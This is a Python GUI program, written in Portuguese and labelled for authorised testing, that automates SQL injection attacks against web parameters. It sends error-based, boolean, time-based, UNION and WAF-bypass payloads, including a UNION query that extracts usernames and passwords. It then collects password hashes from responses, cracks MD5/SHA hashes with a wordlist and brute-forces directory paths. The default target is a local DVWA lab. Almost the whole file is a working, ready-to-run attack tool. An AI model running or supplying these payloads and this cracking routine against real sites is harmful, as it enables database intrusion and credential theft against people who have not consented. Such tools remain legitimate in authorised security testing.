#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLi Scanner - Testes Autorizados
Inclui: SQL Injection (error/boolean/time/union) + Descoberta de Hashes + Cracking por Wordlist.
Uso exclusivo em alvos com autorização.
"""
import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext
import requests
import urllib.parse
import re
import threading
import time
import html
import webbrowser
import hashlib
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

TIMEOUT = 10
RECON_THREADS = 5

# ========================= PAYLOADS =========================
PAYLOADS = [
    # Error-based
    ("'", "Erro SQL clássico"),
    ("1'", "Erro de sintaxe após número"),
    ("1' AND extractvalue(1, concat(0x7e, version()))-- ", "Error-based MySQL extractvalue"),
    ("1' AND updatexml(1, concat(0x7e, version()), 1)-- ", "Error-based MySQL updatexml"),
    ("1' AND 1=CONVERT(int, @@version)-- ", "Error-based MSSQL"),
    # Auth bypass / boolean
    ("' OR '1'='1", "Bypass clássico string"),
    ("1' OR '1'='1", "Bypass de autenticação (OR 1=1)"),
    ("1 OR 1=1", "Bypass numérico"),
    ("1' OR '1'='1' -- ", "Bypass com comentário"),
    ("' OR 1=1#", "Bypass hash comment"),
    ("admin'-- ", "Login bypass admin"),
    ("1 AND 1=1", "Booleano TRUE (baseline)"),
    ("1 AND 1=2", "Booleano FALSE"),
    ("1' AND '1'='1", "Booleano string TRUE"),
    ("1' AND '1'='2", "Booleano string FALSE"),
    # Time-based
    ("1' AND SLEEP(5)-- ", "Time-based MySQL"),
    ("1 AND SLEEP(5)", "Time-based MySQL numérico"),
    ("1'; WAITFOR DELAY '0:0:5'-- ", "Time-based MSSQL"),
    ("1' AND pg_sleep(5)-- ", "Time-based PostgreSQL"),
    ("1' AND BENCHMARK(5000000, SHA1('t'))-- ", "Time-based BENCHMARK"),
    # UNION
    ("1 UNION SELECT NULL-- ", "UNION 1 coluna"),
    ("1 UNION SELECT NULL,NULL-- ", "UNION 2 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL-- ", "UNION 3 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL-- ", "UNION 4 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "UNION 5 colunas"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "UNION 6 colunas"),
    ("1' UNION SELECT NULL,NULL-- ", "UNION string 2 colunas"),
    ("1' UNION SELECT NULL,NULL,NULL-- ", "UNION string 3 colunas"),
    ("1' UNION SELECT version(),database()-- ", "UNION extraindo versão/banco"),
    ("1' UNION SELECT table_name,NULL FROM information_schema.tables-- ", "UNION listando tabelas"),
    ("1' UNION SELECT user,password FROM users-- ", "UNION extraindo credenciais (DVWA)"),
    ("1' UNION SELECT @@version,@@datadir-- ", "UNION MSSQL/MySQL info"),
    # WAF bypass
    ("1//OR//1=1", "Inline comments"),
    ("1 /*!50000OR*/ 1=1", "MySQL version comment"),
    ("1 OR 0x31=0x31", "Hex encoding"),
    ("1 %00OR 1=1", "Null byte"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "mysql_fetch", "pg_query",
    "sqlite3.operationalerror", "ora-01756", "microsoft ole db provider",
    "odbc sql server driver", "syntax error", "unterminated string",
    "sqlsyntaxerrorexception", "error in your sql",
]

TIME_LIMIT = 10

# ========================= HASHES =========================
HASH_PATTERNS = [
    (r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}", "bcrypt"),
    (r"\$argon2(?:id|i|d)\$[^\s\"'<>]{20,}", "argon2"),
    (r"\b[a-fA-F0-9]{128}\b", "SHA-512"),
    (r"\b[a-fA-F0-9]{96}\b", "SHA-384"),
    (r"\b[a-fA-F0-9]{64}\b", "SHA-256"),
    (r"\b[a-fA-F0-9]{40}\b", "SHA-1"),
    (r"\b[a-fA-F0-9]{32}\b", "MD5"),
    (r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b", "JWT"),
]

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (SQLi-Scanner-GUI; Auth-Test)"


# ========================= HELPERS =========================
def extract_data(body):
    out = []

    for pattern in (
        r"ID:\s*([^<\r\n]+)",
        r"First\s*name:\s*([^<\r\n]+)",
        r"Surname:\s*([^<\r\n]+)",
    ):
        for item in re.findall(pattern, body, re.I):
            item = re.sub(r"<[^>]+>", "", item).strip()
            if item and item not in out:
                out.append(item)

    rows = re.findall(
        r"<tr[^>]*>\s*<td[^>]*>(.*?)</td>\s*<td[^>]*>(.*?)</td>",
        body, re.I | re.S,
    )
    for a, b in rows[:20]:
        a = re.sub(r"<[^>]+>", "", a).strip()
        b = re.sub(r"<[^>]+>", "", b).strip()
        if a or b:
            out.append(f"{a} | {b}")

    return list(dict.fromkeys(out))


def find_hashes(text):
    """Retorna lista de (tipo, hash, contexto) encontrada no corpo."""
    found = []
    seen = set()
    for pattern, htype in HASH_PATTERNS:
        for m in re.finditer(pattern, text):
            h = m.group(0)
            if h.lower() in seen:
                continue
            seen.add(h.lower())
            start = max(0, m.start() - 40)
            end = min(len(text), m.end() + 40)
            ctx = re.sub(r"\s+", " ", text[start:end]).strip()
            found.append((htype, h, ctx))
    return found


def algos_for_hash(h):
    """Retorna as funções de hash a testar, baseado no tamanho do hash."""
    n = len(h)
    if n == 32:
        return [("md5", hashlib.md5)]
    if n == 40:
        return [("sha1", hashlib.sha1)]
    if n == 64:
        return [("sha256", hashlib.sha256)]
    if n == 96:
        return [("sha384", hashlib.sha384)]
    if n == 128:
        return [("sha512", hashlib.sha512)]
    return []


# ========================= APP =========================
class App:
    def __init__(self, root):
        self.root = root
        root.title("SQLi Scanner - Testes Autorizados")
        root.geometry("1100x780")
        root.minsize(880, 600)

        f = ttk.Frame(root, padding=10)
        f.pack(fill="both", expand=True)
        f.columnconfigure(1, weight=1)
        f.rowconfigure(6, weight=1)

        ttk.Label(f, text="URL alvo:").grid(row=0, column=0, sticky="w")
        self.url = ttk.Entry(f)
        self.url.grid(row=0, column=1, padx=5, sticky="ew")
        self.url.insert(
            0,
            "http://192.168.0.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
        )

        ttk.Label(f, text="Cookie:").grid(row=1, column=0, sticky="w")
        self.cookie = ttk.Entry(f)
        self.cookie.grid(row=1, column=1, padx=5, sticky="ew")
        self.cookie.insert(0, "PHPSESSID=329f6tjl62ekmjrpibd5kor3f5; security=low")

        ttk.Label(f, text="POST:").grid(row=2, column=0, sticky="w")
        self.post = ttk.Entry(f)
        self.post.grid(row=2, column=1, padx=5, sticky="ew")
        self.post.insert(0, "Submit=Submit")

        # ---- Wordlist + botão Procurar ----
        ttk.Label(f, text="Wordlist:").grid(row=3, column=0, sticky="w")
        self.wordlist = ttk.Entry(f)
        self.wordlist.grid(row=3, column=1, padx=5, sticky="ew")
        ttk.Button(f, text="Procurar...", command=self.browse_wordlist).grid(
            row=3, column=2, padx=8, sticky="ew"
        )

        # ---- Botão principal de scan ----
        self.btn = ttk.Button(f, text="Escanear SQLi", command=self.start)
        self.btn.grid(row=0, column=2, rowspan=2, padx=8, sticky="ew")

        # ---- Botão Quebrar Hashes (manual) ----
        self.btn_crack = ttk.Button(f, text="Quebrar Hashes", command=self.start_crack)
        self.btn_crack.grid(row=4, column=0, columnspan=3, padx=0, pady=(6, 0), sticky="ew")

        # ---- Barra de progresso determinada 0..100 ----
        self.progress = ttk.Progressbar(f, mode="determinate", maximum=100)
        self.progress.grid(row=5, column=0, columnspan=3, sticky="ew", pady=(6, 0))

        self.log = scrolledtext.ScrolledText(f, wrap="none")
        self.log.grid(row=6, column=0, columnspan=3, sticky="nsew", pady=10)

        ttk.Button(f, text="Salvar relatório HTML", command=self.save).grid(
            row=7, column=1
        )

        self.results = []
        self.findings = []
        self.hash_findings = []
        self.recon_findings = []

    # ---------- logging ----------
    def write(self, text):
        self.root.after(0, self._write, text)

    def _write(self, text):
        self.log.insert("end", text + "\n")
        self.log.see("end")

    # ---------- progresso ----------
    def set_progress(self, value):
        value = max(0, min(100, value))

        def _do():
            self.progress.config(value=value)

        self.root.after(0, _do)

    def busy(self, on):
        def _do():
            if on:
                self.progress.config(value=0)
                self.btn.config(state="disabled")
                self.btn_crack.config(state="disabled")
            else:
                self.progress.config(value=100)
                self.btn.config(state="normal")
                self.btn_crack.config(state="normal")
        self.root.after(0, _do)

    # ---------- cookies ----------
    def cookies(self):
        result = {}
        for item in self.cookie.get().split(";"):
            if "=" in item:
                k, v = item.strip().split("=", 1)
                result[k] = v
        return result

    def browse_wordlist(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist (ex.: rockyou.txt)",
            filetypes=[
                ("Listas de palavras", "*.txt *.lst *.wordlist"),
                ("Todos os arquivos", "*.*"),
            ],
        )
        if path:
            self.wordlist.delete(0, "end")
            self.wordlist.insert(0, path)
            size = os.path.getsize(path) if os.path.isfile(path) else 0
            self.write(f"[*] Wordlist selecionada: {path} ({size/1024/1024:.1f} MB)")

    def load_recon_wordlist(self, path):
        """Lê a wordlist escolhida no PC e devolve entradas únicas de caminhos."""
        words, seen = [], set()
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                for line in fh:
                    w = line.strip()
                    if not w or w.startswith("#"):
                        continue
                    w = w.lstrip("/")
                    if w in seen:
                        continue
                    seen.add(w)
                    words.append(w)
        except OSError as e:
            self.write(f"[ERRO] Lendo wordlist: {e}")
            return []
        return words

    # ---------- request helpers ----------
    def request_data(self, url, param, payload):
        p = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)

        if qs:
            qs[param] = [payload]
            q = urllib.parse.urlencode(qs, doseq=True)
            return urllib.parse.urlunparse(p._replace(query=q)), None

        data = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
        if param not in data:
            return None, None
        data[param] = [payload]
        return url, data

    def send(self, url, data=None):
        t = time.time()
        try:
            if data is not None:
                r = session.post(url, data=data, timeout=TIMEOUT)
            else:
                r = session.get(url, timeout=TIMEOUT)
            return r, time.time() - t, None
        except requests.RequestException as e:
            return None, 0, str(e)

    # ========================= SQLi =========================
    def start(self):
        url = self.url.get().strip()
        if not url:
            return

        session.cookies.clear()
        session.cookies.update(self.cookies())

        self.log.delete("1.0", "end")
        self.results.clear()
        self.findings.clear()
        self.hash_findings.clear()
        self.recon_findings.clear()

        self.busy(True)
        threading.Thread(target=self.scan, args=(url,), daemon=True).start()

    def scan(self, url):
        try:
            p = urllib.parse.urlparse(url)
            get = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            post = urllib.parse.parse_qs(self.post.get(), keep_blank_values=True)
            params = get or post
            params = [x for x in params if x.lower() != "submit"]

            self.write(f"[*] Alvo: {url}")

            if not params:
                self.write("[!] Nenhum parâmetro encontrado.")
                return

            base, _, err = self.send(url, post if not get else None)
            base_len = len(base.text) if base else 0
            base_status = base.status_code if base else 0

            if err:
                self.write(f"[!] Request base: {err}")

            if base:
                for htype, h, ctx in find_hashes(base.text):
                    self._register_hash(htype, h, ctx, url)

            # ---- total de passos para a barra ir de 0 a 100% ----
            steps_per_param = 2 + len(PAYLOADS)  # 2 testes booleanos + payloads
            total_steps = len(params) * steps_per_param
            done_steps = 0

            def tick():
                nonlocal done_steps
                done_steps += 1
                self.set_progress(int(done_steps * 100 / total_steps))

            self.set_progress(0)

            for param in params:
                self.write(f"\n[>] Testando: {param}\n")

                true_len = false_len = None

                for payload, tag in (
                    ("1 AND 1=1", "TRUE"),
                    ("1 AND 1=2", "FALSE"),
                ):
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue
                    r, _, _ = self.send(u, data)
                    if not r:
                        continue
                    if tag == "TRUE":
                        true_len = len(r.text)
                    else:
                        false_len = len(r.text)

                blind = (
                    true_len is not None
                    and false_len is not None
                    and abs(true_len - false_len) > 20
                )

                if blind:
                    self.write(
                        f"[+] Diferença booleana: TRUE={true_len} FALSE={false_len}"
                    )

                for payload, desc in PAYLOADS:
                    u, data = self.request_data(url, param, payload)
                    tick()
                    if not u:
                        continue

                    r, elapsed, error = self.send(u, data)
                    if not r:
                        self.write(f"[-] {error}")
                        continue

                    body = r.text.lower()
                    vuln = None

                    for e in SQL_ERRORS:
                        if e in body:
                            vuln = f"Erro SQL: {e}"
                            break

                    if (
                        not vuln
                        and elapsed > 5
                        and any(
                            x in payload.lower()
                            for x in ("sleep", "waitfor", "benchmark", "pg_sleep")
                        )
                    ):
                        vuln = f"Resposta lenta: {elapsed:.1f}s"

                    if (
                        not vuln
                        and true_len is not None
                        and false_len is not None
                        and blind
                        and ("1=1" in payload or "'1'='1" in payload)
                    ):
                        if (
                            abs(len(r.text) - true_len) < 50
                            and "and" in payload.lower()
                            and "1=2" not in payload
                        ):
                            vuln = "Resposta semelhante ao TRUE"

                    if (
                        not vuln
                        and (
                            "or 1=1" in payload.lower()
                            or "or '1'='1" in payload.lower()
                        )
                        and abs(len(r.text) - base_len) > 100
                    ):
                        vuln = f"Conteúdo alterado: {base_len} -> {len(r.text)} bytes"

                    if not vuln and "union select" in payload.lower():
                        if base_status and r.status_code != base_status:
                            vuln = f"UNION alterou status: {base_status}->{r.status_code}"
                        elif abs(len(r.text) - base_len) > 100:
                            vuln = "UNION alterou o conteúdo"

                    leaked = []
                    if vuln or any(
                        x in payload.lower()
                        for x in ("union select", "information_schema", "from users")
                    ):
                        leaked = extract_data(r.text)
                        for htype, h, ctx in find_hashes(r.text):
                            self._register_hash(htype, h, ctx, u)

                    item = (
                        param, payload, r.status_code, elapsed,
                        bool(vuln), desc, vuln, len(r.text), leaked,
                    )
                    self.results.append(item)

                    if vuln:
                        self.findings.append((param, payload, desc, vuln, u, leaked))
                        self.write(
                            f"\n[VULN] {param} | {payload[:35]} | "
                            f"{r.status_code} | {elapsed:.1f}s\n")

                        for x in leaked[:10]:
                            self.write(f"       {x}")
                    else:
                        self.write(
                            f"\n\n[ OK ] {param} | {payload[:35]} | "
                            f"{r.status_code} | {elapsed:.1f}s\n")

                    time.sleep(0.15)

            self.write(f"\n[*] Concluído: {len(self.findings)} achados")
            if self.hash_findings:
                self.write(f"\n[*] Hashes Encontrados: {len(self.hash_findings)}")

            # ---- Cracking AUTOMÁTICO se houver wordlist selecionada ----
            path = self.wordlist.get().strip()
            self.auto_crack(path)

        except Exception as e:
            self.write(f"[ERRO] {e}")
        finally:
            self.busy(False)

    # ========================= HASHS =========================
    def _register_hash(self, htype, h, ctx, source):
        for item in self.hash_findings:
            if item[1].lower() == h.lower():
                return
        # Nada de cracking automático aqui: só registra o hash encontrado.
        self.hash_findings.append((htype, h, ctx, source, None))
        self.write(f"[HASH] {htype}: {h}")

    def start_hash_scan(self):
        url = self.url.get().strip()
        if not url:
            return
        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.busy(True)

        def worker():
            try:
                self.write(f"[*] Buscando hashes em: {url}")
                r, elapsed, err = self.send(url)
                if err or not r:
                    self.write(f"[!] {err or 'sem resposta'}")
                    return
                found = find_hashes(r.text)
                if not found:
                    self.write("[-] Nenhum hash encontrado na resposta.")
                for htype, h, ctx in found:
                    self._register_hash(htype, h, ctx, url)
                self.write(f"[*] Total: {len(found)} candidatos")
            finally:
                self.busy(False)

        threading.Thread(target=worker, daemon=True).start()

    # ========================= CRACKING =========================
    def build_targets(self):
        """Monta o mapa hash -> índices dos hashes quebráveis por wordlist."""
        targets = {}
        for idx, (htype, h, ctx, source, cracked) in enumerate(self.hash_findings):
            candidates = algos_for_hash(h)
            if not candidates:
                continue  # bcrypt/argon2/JWT não são quebráveis por wordlist simples
            targets.setdefault(h.lower(), []).append(idx)
        return targets

    def auto_crack(self, path):
        """Chamado ao final do scan: quebra os hashes automaticamente se houver wordlist."""
        if not self.hash_findings:
            return
        if not path or not os.path.isfile(path):
            if self.hash_findings:
                self.write(
                    "\n\n[*] Nenhuma wordlist selecionada — hashes não serão quebrados "
                    "automaticamente."
                )
            return

        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.\n")
            return

        self.write("\n[*] Wordlist detectada — iniciando cracking automático\n")
        self.run_crack(path, targets)

    def start_crack(self):
        """Botão manual: percorre a wordlist testando quebrar todos os hashes."""
        if not self.hash_findings:
            self.write("[!] Nenhum hash encontrado ainda. Faça o Escanear SQLi primeiro\n")
            return

        path = self.wordlist.get().strip()
        if not path or not os.path.isfile(path):
            self.write("[!] Selecione uma wordlist válida (botão Procurar...).")
            return

        targets = self.build_targets()
        if not targets:
            self.write("[!] Nenhum hash do tipo quebrável (MD5/SHA) foi encontrado.")
            return

        self.busy(True)
        self.write(
            f"[*] Iniciando ataque de dicionário\n"
            f"[*] Wordlist: {path}\n\n"
            f"[*] Hashes alvo: {len(targets)}\n"
        )
        threading.Thread(target=self.crack_worker, args=(path, targets), daemon=True).start()

    def crack_worker(self, path, targets):
        """Roda em thread própria (botão manual)."""
        try:
            self.run_crack(path, targets)
        finally:
            self.busy(False)

    def run_crack(self, path, targets):
        """Lógica de cracking por wordlist (usada pelo scan e pelo botão manual)."""
        try:
            total_size = os.path.getsize(path)
            processed = 0
            found = {}            # hash -> palavra
            remaining = set(targets.keys())
            start = time.time()

            self.write(
                f"[*] Wordlist: {path}\n\n"
                f"[*] Hashes alvo: {len(targets)}\n\n"
            )

            with open(path, "rb") as fh:
                for raw in fh:
                    word = raw.strip()
                    if not word:
                        continue

                    # Para cada hash alvo, testa apenas os algoritmos do seu tamanho.
                    still = set(remaining)
                    for h in still:
                        for _, fn in algos_for_hash(h):
                            if fn(word).hexdigest() == h:
                                found[h] = word.decode("utf-8", "ignore")
                                remaining.discard(h)
                                break

                    processed += len(raw)
                    if processed % (1 << 20) < len(raw):  # atualiza ~1MB
                        pct = int(processed * 100 / total_size) if total_size else 0
                        self.set_progress(pct)

                    if not remaining:
                        break

            elapsed = time.time() - start

            # Aplica resultados de volta nos hash_findings
            for h, word in found.items():
                for idx in targets[h]:
                    htype, hh, ctx, source, _ = self.hash_findings[idx]
                    self.hash_findings[idx] = (htype, hh, ctx, source, word)

            for h, word in found.items():
                self.write(f"[+] CRACKED  {h}  =>  {word}")

            for h in remaining:
                self.write(f"\n\n[-] Não quebrado: {h}")

            self.write(
                f"\n[*] Cracking concluído em {elapsed:.1f}s "
                f"({len(found)}/{len(targets)} quebrados, {processed/1024/1024:.1f} MB lidos)\n\n"
            )
        except Exception as e:
            self.write(f"[ERRO] Cracking: {e}")

    # ========================= RECON (wordlist do PC) =========================
    def start_recon(self):
        url = self.url.get().strip()
        if not url:
            self.write("[!] Informe a URL alvo antes do recon.")
            return

        wordlist_path = filedialog.askopenfilename(
            title="Selecione a wordlist de diretórios/arquivos",
            filetypes=[
                ("Listas de palavras", "*.txt *.lst *.wordlist"),
                ("Todos os arquivos", "*.*"),
            ],
        )
        if not wordlist_path:
            self.write("[!] Recon cancelado: nenhuma wordlist selecionada.")
            return

        words = self.load_recon_wordlist(wordlist_path)
        if not words:
            self.write("[!] Wordlist vazia ou ilegível.")
            return

        session.cookies.clear()
        session.cookies.update(self.cookies())
        self.recon_findings.clear()
        self.busy(True)
        self.write(
            f"[*] Recon em {url}\n"
            f"[*] Wordlist: {wordlist_path} ({len(words)} entradas)\n"
        )

        threading.Thread(target=self.recon, args=(url, words), daemon=True).start()

    def recon(self, url, words):
        total = len(words)
        done = 0

        try:
            base = url.rstrip("/") + "/"

            def probe(entry):
                if entry.startswith(("http://", "https://")):
                    target = entry
                else:
                    target = urllib.parse.urljoin(base, entry)
                r, elapsed, err = self.send(target)
                return entry, target, r, elapsed, err

            with ThreadPoolExecutor(max_workers=RECON_THREADS) as pool:
                futures = {pool.submit(probe, w): w for w in words}
                for fut in as_completed(futures):
                    entry, target, r, elapsed, err = fut.result()
                    done += 1

                    if done % 25 == 0 or done == total:
                        self.write(f"[*] Progresso: {done}/{total}")

                    if err or not r:
                        continue

                    if r.status_code in (200, 301, 302, 401, 403, 500):
                        self.recon_findings.append(
                            (entry, r.status_code, len(r.text), elapsed, target)
                        )
                        self.write(
                            f"[{r.status_code}] /{entry}"
                            f" ({len(r.text)} bytes, {elapsed:.1f}s)"
                        )
                        server = r.headers.get("Server")
                        if server:
                            self.write(f"      Server: {server}")

            self.write(
                f"\n[*] Recon concluído: "
                f"{len(self.recon_findings)} recursos interessantes"
            )
        except Exception as e:
            self.write(f"[ERRO] Recon: {e}")
        finally:
            self.busy(False)

    # ========================= REPORT =========================
    def save(self):
        if not self.results and not self.hash_findings and not self.recon_findings:
            self.write("[!] Nenhum resultado.")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".html", filetypes=[("HTML", "*.html")]
        )
        if not filename:
            return

        rows = ""
        for (param, payload, status, elapsed, vuln, desc, detail, length, leaked) in self.results:
            color = "#fdecea" if vuln else "#eaf7ea"
            badge = "VULNERÁVEL" if vuln else "OK"
            leak = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:15])
            rows += f"""
            <tr style="background:{color}">
              <td>{html.escape(param)}</td>
              <td><code>{html.escape(payload)}</code></td>
              <td>{html.escape(desc)}</td>
              <td>{status}</td>
              <td>{length}</td>
              <td>{elapsed:.1f}s</td>
              <td><b>{badge}</b></td>
              <td>{html.escape(detail or "-")}<ul>{leak}</ul></td>
            </tr>
            """

        findings = ""
        for i, (param, payload, desc, detail, test_url, leaked) in enumerate(self.findings, 1):
            data = "".join(f"<li>{html.escape(x)}</li>" for x in leaked[:20])
            findings += f"""
            <div class="card">
              <h3>Achado #{i}</h3>
              <p><b>Parâmetro:</b> {html.escape(param)}</p>
              <p><b>Técnica:</b> {html.escape(desc)}</p>
              <p><b>Payload:</b> <code>{html.escape(payload)}</code></p>
              <p><b>Evidência:</b> {html.escape(detail)}</p>
              <p><b>URL:</b> {html.escape(test_url)}</p>
              <ul>{data}</ul>
            </div>
            """

        hashes = ""
        for htype, h, ctx, source, cracked in self.hash_findings:
            crack = f"<b>Quebrado:</b> {html.escape(cracked)}" if cracked else "Não quebrado"
            hashes += f"""
            <div class="card" style="border-left-color:#f9a825">
              <h3>{html.escape(htype)}</h3>
              <p><b>Hash:</b> <code>{html.escape(h)}</code></p>
              <p><b>Contexto:</b> {html.escape(ctx)}</p>
              <p><b>Origem:</b> {html.escape(source)}</p>
              <p>{crack}</p>
            </div>
            """

        recon = ""
        for entry, status, length, elapsed, target in sorted(
            self.recon_findings, key=lambda x: x[1]
        ):
            recon += f"""
            <tr>
              <td><code>/{html.escape(entry)}</code></td>
              <td>{status}</td>
              <td>{length}</td>
              <td>{elapsed:.1f}s</td>
              <td><code>{html.escape(target)}</code></td>
            </tr>
            """

        doc = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>Relatório SQLi</title>
<style>
 body{{font-family:Arial;background:#f1f3f5;padding:25px}}
 main{{max-width:1250px;margin:auto}}
 header{{background:#1a237e;color:white;padding:25px;border-radius:10px}}
 .stat{{display:inline-block;background:white;padding:18px;margin:10px 5px;border-radius:8px}}
 table{{width:100%;border-collapse:collapse;background:white}}
 th{{background:#283593;color:white;padding:9px}}
 td{{padding:8px;border-bottom:1px solid #ddd;vertical-align:top}}
 code{{background:#eee;padding:3px;word-break:break-all}}
 .card{{background:white;margin:15px 0;padding:18px;border-left:5px solid #d32f2f;border-radius:8px}}
 footer{{margin-top:20px;color:#555;font-size:12px}}
</style>
</head>
<body>
<main>
 <header>
  <h1>&#128737; Relatório de SQL Injection</h1>
  <p><b>Alvo:</b> {html.escape(self.url.get())}</p>
  <p>Gerado em: {datetime.now():%d/%m/%Y %H:%M}</p>
 </header>
 <div class="stat"><b>{len(self.findings)}</b><br>Achados SQLi</div>
 <div class="stat"><b>{len(self.results)}</b><br>Testes</div>
 <div class="stat"><b>{len(self.hash_findings)}</b><br>Hashes</div>
 <div class="stat"><b>{len(self.recon_findings)}</b><br>Recursos</div>

 <h2>&#128270; Evidências SQLi</h2>
 {findings or "<p>Nenhum achado confirmado.</p>"}

 <h2>&#128273; Hashes Encontrados</h2>
 {hashes or "<p>Nenhum hash encontrado.</p>"}

 <h2>&#128193; Recon (Wordlist)</h2>
 <table>
  <tr><th>Recurso</th><th>Status</th><th>Bytes</th><th>Tempo</th><th>URL</th></tr>
  {recon or "<tr><td colspan=5>Nenhum recurso encontrado.</td></tr>"}
 </table>

 <h2>&#128203; Todos os testes</h2>
 <table>
  <tr><th>Parâmetro</th><th>Payload</th><th>Técnica</th><th>Status</th>
      <th>Bytes</th><th>Tempo</th><th>Resultado</th><th>Evidência</th></tr>
  {rows}
 </table>

 <h2>&#128274; Recomendações</h2>
 <ul>
  <li>Use queries parametrizadas/prepared statements.</li>
  <li>Valide os tipos e formatos das entradas.</li>
  <li>Use princípio do menor privilégio no banco.</li>
  <li>Não exponha erros SQL ao usuário.</li>
  <li>Use hashes fortes com salt (bcrypt/argon2) e nunca MD5/SHA-1 para senhas.</li>
  <li>Use WAF como camada complementar, não como substituto.</li>
 </ul>
 <footer>SQLi Scanner — somente para testes autorizados</footer>
</main>
</body>
</html>"""

        try:
            with open(filename, "w", encoding="utf-8") as fh:
                fh.write(doc)
            self.write(f"[+] Relatório salvo: {filename}")
            webbrowser.open(filename)
        except OSError as e:
            self.write(f"[ERRO] Salvando relatório: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    App(root)
    root.mainloop()
